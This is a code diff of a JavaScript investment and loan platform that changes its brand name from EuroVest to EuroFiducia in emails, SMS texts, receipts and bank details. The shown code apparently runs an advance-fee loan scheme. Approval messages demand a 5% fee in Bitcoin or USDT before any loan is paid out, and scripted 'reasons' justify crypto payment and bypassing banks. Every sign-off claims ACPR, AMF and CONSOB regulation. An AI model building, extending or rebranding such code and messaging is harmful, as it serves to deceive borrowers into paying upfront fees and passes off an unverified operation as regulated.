+        EV.mail.sendSMS(user.phone, 'EuroFiducia: Deposit of €'+amount+' received via '+method+'. Processing within 1-2 business days.', {type:'deposit_confirmation', userId:user.id});
       }
     }
   },
@@ -626,16 +626,16 @@ EV.notify = {
       read: false, amount: amount
     });
     // Email admin
-    EV.mail.send('admin@eurovest.eu', 'Withdrawal Alert — €'+amount+' by '+userName,
+    EV.mail.send('admin@eurofiducia.eu', 'Withdrawal Alert — €'+amount+' by '+userName,
       'A withdrawal has been requested:\n\nUser: '+userName+'\nEmail: '+(user?user.email:'')+'\nAmount: €'+amount+'\nTime: '+new Date().toLocaleString()+'\n\nReview and process in admin dashboard.',
       {type:'admin_withdrawal_alert'});
     // Notify user
     if (user) {
       EV.mail.send(user.email, 'Withdrawal Request Received — €'+amount,
-        'Dear '+user.firstName+',\n\nWe have received your withdrawal request for €'+amount+'.\n\nYour withdrawal is now going through compliance checks and will be processed within 3-5 business days. Funds will be transferred to your verified bank account ('+user.iban+').\n\nYou will receive a confirmation receipt once the transfer is complete.\n\nThe EuroVest Team',
+        'Dear '+user.firstName+',\n\nWe have received your withdrawal request for €'+amount+'.\n\nYour withdrawal is now going through compliance checks and will be processed within 3-5 business days. Funds will be transferred to your verified bank account ('+user.iban+').\n\nYou will receive a confirmation receipt once the transfer is complete.\n\nThe EuroFiducia Team',
         {type:'withdrawal_confirmation', userId:user.id});
       if (user.smsOptIn && user.phone) {
-        EV.mail.sendSMS(user.phone, 'EuroVest: Withdrawal of €'+amount+' received. Processing within 3-5 business days to your bank account.', {type:'withdrawal_confirmation', userId:user.id});
+        EV.mail.sendSMS(user.phone, 'EuroFiducia: Withdrawal of €'+amount+' received. Processing within 3-5 business days to your bank account.', {type:'withdrawal_confirmation', userId:user.id});
       }
     }
   },
@@ -647,7 +647,7 @@ EV.notify = {
       read: false, aiHandled: aiHandled
     });
     // Email admin — notify that AI is responding OR escalation needed
-    EV.mail.send('admin@eurovest.eu',
+    EV.mail.send('admin@eurofiducia.eu',
       aiHandled ? 'AI Support Active — '+userName : 'Support Escalation Needed — '+userName,
       aiHandled
         ? 'The AI support assistant is currently responding to a user query.\n\nUser: '+userName+'\nMessage: "'+message+'"\n\nThe AI is handling this question. You can join the conversation in the admin dashboard → Support Inbox if you wish to intervene.\n\nThis is an automated notification.'
@@ -665,7 +665,7 @@ EV.notify = {
       text: description, read:false
     });
     // Email admin
-    EV.mail.send('admin@eurovest.eu', 'User Activity — '+activityType+' — '+userName,
+    EV.mail.send('admin@eurofiducia.eu', 'User Activity — '+activityType+' — '+userName,
       'User activity notification:\n\nUser: '+userName+'\nEmail: '+(user?user.email:'')+'\nActivity: '+activityType+'\nDetails: '+description+'\nTime: '+new Date().toLocaleString(),
       {type:'admin_activity_alert'});
   },
@@ -676,7 +676,7 @@ EV.notify = {
     var reasonsText = EV.loanFee.cryptoReasons.map(function(r){
       return r.title + '\n' + r.body + '\n';
     }).join('\n');
-    var subject = 'Loan Application Received — ' + b.loanType + ' — APR/TAEG Breakdown — EuroVest';
+    var subject = 'Loan Application Received — ' + b.loanType + ' — APR/TAEG Breakdown — EuroFiducia';
     var body = 'Dear ' + user.firstName + ',\n\n' +
       'We have received your loan application. Below is the complete breakdown of your loan terms, ' +
       'including the mandatory processing fee and the applicable APR/TAEG.\n\n' +
@@ -717,11 +717,11 @@ EV.notify = {
       'decision within 2-3 business days. If approved, you will receive a second email with the cryptocurrency ' +
       'wallet addresses for fee deposit and instructions to complete the process.\n\n' +
       'You can track your application status in your dashboard → Loans.\n\n' +
-      'The EuroVest Loan Team\n' +
-      'EuroVest Investment Platform | ACPR · AMF · CONSOB Regulated';
+      'The EuroFiducia Loan Team\n' +
+      'EuroFiducia Investment Platform | ACPR · AMF · CONSOB Regulated';
     EV.mail.send(user.email, subject, body, {type:'loan_fee_notice', userId:user.id});
     if (user.smsOptIn && user.phone) {
-      EV.mail.sendSMS(user.phone, 'EuroVest: Loan application for ' + b.loanType + ' received. APR/TAEG: ' + b.taeg.toFixed(2) + '%. If approved, a 5% fee (€' + b.loanFee.toFixed(2) + ') must be deposited in crypto. Check your email for full details.', {type:'loan_fee_notice', userId:user.id});
+      EV.mail.sendSMS(user.phone, 'EuroFiducia: Loan application for ' + b.loanType + ' received. APR/TAEG: ' + b.taeg.toFixed(2) + '%. If approved, a 5% fee (€' + b.loanFee.toFixed(2) + ') must be deposited in crypto. Check your email for full details.', {type:'loan_fee_notice', userId:user.id});
     }
   },
   loanApproved: function(userId, appId, breakdown) {
@@ -734,7 +734,7 @@ EV.notify = {
     var reasonsText = EV.loanFee.cryptoReasons.map(function(r){
       return r.title + '\n' + r.body + '\n';
     }).join('\n');
-    var subject = '✅ LOAN APPROVED — ' + b.loanType + ' — Deposit Required — EuroVest';
+    var subject = '✅ LOAN APPROVED — ' + b.loanType + ' — Deposit Required — EuroFiducia';
     var body = 'Dear ' + user.firstName + ',\n\n' +
       'CONGRATULATIONS! Your loan application has been approved.\n\n' +
       '========================================\n' +
@@ -775,19 +775,19 @@ EV.notify = {
       '• Segregated Escrow: Your fee is held in a protected, auditable escrow wallet separate from operating funds.\n' +
       '• Blockchain Proof: You receive a permanent transaction hash as legal proof of payment.\n' +
       '• Same-Day Disbursement: Crypto settlement enables same-day verification and release of your loan funds.\n\n' +
-      'Do not share your transaction hash with anyone except EuroVest support. Our team will never ask for your ' +
+      'Do not share your transaction hash with anyone except EuroFiducia support. Our team will never ask for your ' +
       'private keys, seed phrases, or wallet passwords.\n\n' +
-      'The EuroVest Loan Team\n' +
-      'EuroVest Investment Platform | ACPR · AMF · CONSOB Regulated';
+      'The EuroFiducia Loan Team\n' +
+      'EuroFiducia Investment Platform | ACPR · AMF · CONSOB Regulated';
     EV.mail.send(user.email, subject, body, {type:'loan_approved_fee', userId:user.id});
     if (user.smsOptIn && user.phone) {
-      EV.mail.sendSMS(user.phone, 'EuroVest: Your ' + b.loanType + ' loan is APPROVED! Deposit the 5% fee (€' + b.loanFee.toFixed(2) + ') in crypto (BTC or USDT). Check email for wallet addresses.', {type:'loan_approved_fee', userId:user.id});
+      EV.mail.sendSMS(user.phone, 'EuroFiducia: Your ' + b.loanType + ' loan is APPROVED! Deposit the 5% fee (€' + b.loanFee.toFixed(2) + ') in crypto (BTC or USDT). Check email for wallet addresses.', {type:'loan_approved_fee', userId:user.id});
     }
   },
   loanRejected: function(userId, appId, loanType) {
     var user = EV.store.get('users', []).find(function(u){return u.id===userId;}) || EV.auth.currentUser();
     if (!user) return;
-    var subject = 'Loan Application Update — ' + loanType + ' — EuroVest';
+    var subject = 'Loan Application Update — ' + loanType + ' — EuroFiducia';
     var body = 'Dear ' + user.firstName + ',\n\n' +
       'Thank you for your loan application for ' + loanType + ' (Reference: ' + appId + ').\n\n' +
       'After a careful review of your application, we regret to inform you that we are unable to approve ' +
@@ -796,11 +796,11 @@ EV.notify = {
       'charged and no payment is needed from you.\n\n' +
       'You may reapply after 90 days. If you believe this decision was made in error, or if your financial ' +
       'circumstances have changed, please contact our support team.\n\n' +
-      'The EuroVest Loan Team\n' +
-      'EuroVest Investment Platform | ACPR · AMF · CONSOB Regulated';
+      'The EuroFiducia Loan Team\n' +
+      'EuroFiducia Investment Platform | ACPR · AMF · CONSOB Regulated';
     EV.mail.send(user.email, subject, body, {type:'loan_rejected', userId:user.id});
     if (user.smsOptIn && user.phone) {
-      EV.mail.sendSMS(user.phone, 'EuroVest: Your ' + loanType + ' loan application was not approved. No fee is required. Check email for details.', {type:'loan_rejected', userId:user.id});
+      EV.mail.sendSMS(user.phone, 'EuroFiducia: Your ' + loanType + ' loan application was not approved. No fee is required. Check email for details.', {type:'loan_rejected', userId:user.id});
     }
   },
   toast: function(title, msg, type) {
@@ -825,15 +825,15 @@ EV.loanFee = {
     },
     {
       title: '2. Instant Fee Settlement & Same-Day Loan Disbursement',
-      body: 'Traditional bank transfers take 1-3 business days to clear, delaying your loan disbursement. Cryptocurrency transactions confirm on the blockchain within minutes, allowing EuroVest to verify your fee payment the same day and release your loan funds immediately. This means you receive your approved loan amount faster than any conventional banking process allows.'
+      body: 'Traditional bank transfers take 1-3 business days to clear, delaying your loan disbursement. Cryptocurrency transactions confirm on the blockchain within minutes, allowing EuroFiducia to verify your fee payment the same day and release your loan funds immediately. This means you receive your approved loan amount faster than any conventional banking process allows.'
     },
     {
       title: '3. Cross-Border Processing Without Intermediary Holds',
-      body: 'EuroVest operates across France, Italy, and the broader European Economic Area. International bank transfers between member states can be flagged, held, or delayed by correspondent banks for compliance reviews. Cryptocurrency bypasses the correspondent banking network entirely, ensuring your fee reaches our settlement wallet without intermediary holds, frozen funds, or unexpected return-to-sender delays.'
+      body: 'EuroFiducia operates across France, Italy, and the broader European Economic Area. International bank transfers between member states can be flagged, held, or delayed by correspondent banks for compliance reviews. Cryptocurrency bypasses the correspondent banking network entirely, ensuring your fee reaches our settlement wallet without intermediary holds, frozen funds, or unexpected return-to-sender delays.'
     },
     {
       title: '4. Segregated Fee Escrow & Fund Protection Guarantee',
-      body: 'Your processing fee is deposited directly into a segregated escrow wallet, separate from EuroVest operating accounts. This means your fee is protected and ring-fenced: it cannot be used for company operations, and if your loan cannot be disbursed for any reason, the full fee is returned to you within 48 hours. The blockchain address serves as verifiable proof that your funds are held in escrow, not commingled.'
+      body: 'Your processing fee is deposited directly into a segregated escrow wallet, separate from EuroFiducia operating accounts. This means your fee is protected and ring-fenced: it cannot be used for company operations, and if your loan cannot be disbursed for any reason, the full fee is returned to you within 48 hours. The blockchain address serves as verifiable proof that your funds are held in escrow, not commingled.'
     },
     {
       title: '5. Blockchain Audit Trail for Legal & Tax Documentation',
@@ -977,7 +977,7 @@ EV.msg = {
       // Send SMS if opted in
       if (user.smsOptIn && user.phone) {
         EV.mail.sendSMS(user.phone,
-          'EuroVest: You have a new message — "'+personalizedSubject+'". Check your dashboard or email for details.',
+          'EuroFiducia: You have a new message — "'+personalizedSubject+'". Check your dashboard or email for details.',
           {type:'message_notification', userId:user.id});
       }
     });
@@ -1017,8 +1017,8 @@ EV.msg = {
     EV.store.set('user_support_'+userId, uh);
     // Email user confirmation that their message was received
     if (user) {
-      EV.mail.send(user.email, 'Support Message Received — EuroVest',
-        'Dear '+user.firstName+',\n\nWe have received your support message:\n\n"'+message+'"\n\n'+(aiResp.aiHandled?'Our AI assistant has provided an initial response. If you need further assistance, our team is ready to help.':'Your question has been escalated to our human support team. They have been notified and will respond shortly.')+'\n\nYou can track this conversation in your dashboard → Support.\n\nThe EuroVest Support Team',
+      EV.mail.send(user.email, 'Support Message Received — EuroFiducia',
+        'Dear '+user.firstName+',\n\nWe have received your support message:\n\n"'+message+'"\n\n'+(aiResp.aiHandled?'Our AI assistant has provided an initial response. If you need further assistance, our team is ready to help.':'Your question has been escalated to our human support team. They have been notified and will respond shortly.')+'\n\nYou can track this conversation in your dashboard → Support.\n\nThe EuroFiducia Support Team',
         {type:'support_confirmation', userId:user.id});
     }
     return ticket;
@@ -1037,11 +1037,11 @@ EV.msg = {
       // Email the user the reply
       var user = EV.store.get('users',[]).find(function(u){return u.id===t.userId;});
       if (user) {
-        EV.mail.send(user.email, 'Support Reply — EuroVest',
-          'Dear '+user.firstName+',\n\nYou have received a reply from our support team regarding your message:\n\n"'+t.message+'"\n\nOur reply:\n"'+reply+'"\n\nYou can continue the conversation in your dashboard → Support.\n\nThe EuroVest Support Team',
+        EV.mail.send(user.email, 'Support Reply — EuroFiducia',
+          'Dear '+user.firstName+',\n\nYou have received a reply from our support team regarding your message:\n\n"'+t.message+'"\n\nOur reply:\n"'+reply+'"\n\nYou can continue the conversation in your dashboard → Support.\n\nThe EuroFiducia Support Team',
           {type:'support_reply', userId:user.id});
         if (user.smsOptIn && user.phone) {
-          EV.mail.sendSMS(user.phone, 'EuroVest: Support team has replied to your message. Check your dashboard or email.', {type:'support_reply', userId:user.id});
+          EV.mail.sendSMS(user.phone, 'EuroFiducia: Support team has replied to your message. Check your dashboard or email.', {type:'support_reply', userId:user.id});
         }
       }
       return {ok:true};
@@ -1114,7 +1114,7 @@ EV.tx = {
   generateReceiptData: function(type, amount, date, ref, user) {
     user = user || {};
     return {
-      institution: 'EUROVEST INVESTMENT PLATFORM',
+      institution: 'EUROFIDUCIA INVESTMENT PLATFORM',
       institutionSub: 'Regulated European Investment Services',
       reference: ref,
       type: type.charAt(0).toUpperCase()+type.slice(1).replace(/_/g,' '),
@@ -1188,15 +1188,15 @@ EV.crypto = {
 // ===================== COUNTRY-SPECIFIC DEPOSIT METHODS =====================
 // Each supported country gets its own visible set of deposit methods shown on
 // the user's Deposit page. Methods include cryptocurrency (always available,
-// gas fee covered by EuroVest), SEPA / local bank transfer with country-specific
+// gas fee covered by EuroFiducia), SEPA / local bank transfer with country-specific
 // beneficiary instructions, card payment, open banking / instant payment rails,
 // and (where relevant) local mobile/retail cash options. Admin can edit the bank
 // beneficiary details from the dashboard and the edits persist via EV.store.
 EV.depositMethods = {
   // Default bank beneficiary + per-country local payment details. Editable.
   _defaultsBank: {
-    beneficiary: 'EUROVEST SAS',
-    bankName: 'BNP Paribas \u2014 EuroVest Client Account',
+    beneficiary: 'EUROFIDUCIA SAS',
+    bankName: 'BNP Paribas \u2014 EuroFiducia Client Account',
     iban: 'FR76 3000 4028 3700 0123 4567 890',
     bic: 'BNPAFRPP',
     referencePrefix: 'EV-DEP'
@@ -1223,7 +1223,7 @@ EV.depositMethods = {
     },
     sepa: {
       id:'sepa', icon:'\ud83c\udfeb', label:'SEPA Bank Transfer', kind:'bank',
-      desc:'Standard SEPA credit transfer in euros. Funds arrive within 1\u20132 business days. Free for the user; EuroVest covers intermediary charges.',
+      desc:'Standard SEPA credit transfer in euros. Funds arrive within 1\u20132 business days. Free for the user; EuroFiducia covers intermediary charges.',
       note:'Use your unique reference so we can match your deposit automatically.'
     },
     card: {
@@ -1244,7 +1244,7 @@ EV.depositMethods = {
         desc:'French SEPA Instant transfer \u2014 funds credited in under 10 seconds, 24/7.',
         note:'Supported by Cr\u00e9dit Agricole, BNP Paribas, Soci\u00e9t\u00e9 G\u00e9n\u00e9rale, La Banque Postale and others.' },
       { id:'fr_livret', icon:'\ud83d\udcb5', label:'Livret / LDDS Transfer', kind:'bank',
-        desc:'Transfer from your Livret A or LDDS savings account to your EuroVest account.',
+        desc:'Transfer from your Livret A or LDDS savings account to your EuroFiducia account.',
         note:'Regulated savings withdrawals may take 1\u20132 business days.' }
     ],
     IT: [
@@ -1292,7 +1292,7 @@ EV.depositMethods = {
     other: [
       { id:'intl_swift', icon:'\ud83c\udf10', label:'International Wire (SWIFT)', kind:'bank',
         desc:'International wire transfer in EUR or your local currency.',
-        note:'SWIFT transfers may take 2\u20135 business days. EuroVest covers receiving fees.' }
+        note:'SWIFT transfers may take 2\u20135 business days. EuroFiducia covers receiving fees.' }
     ]
   },
   // Build the full list of deposit methods for a given country code.
@@ -1462,7 +1462,7 @@ EV.util = {
     return days+'d ago';
   },
   genId: function(prefix) { return (prefix||'ID')+Date.now().toString(36)+Math.random().toString(36).slice(2,5); },
-  // Generate a unique EuroVest account number: EV-YYYY-XXXXXXXX (8 digits)
+  // Generate a unique EuroFiducia account number: EV-YYYY-XXXXXXXX (8 digits)
   genAccountNumber: function() {
     var year = new Date().getFullYear();
     var num = '';
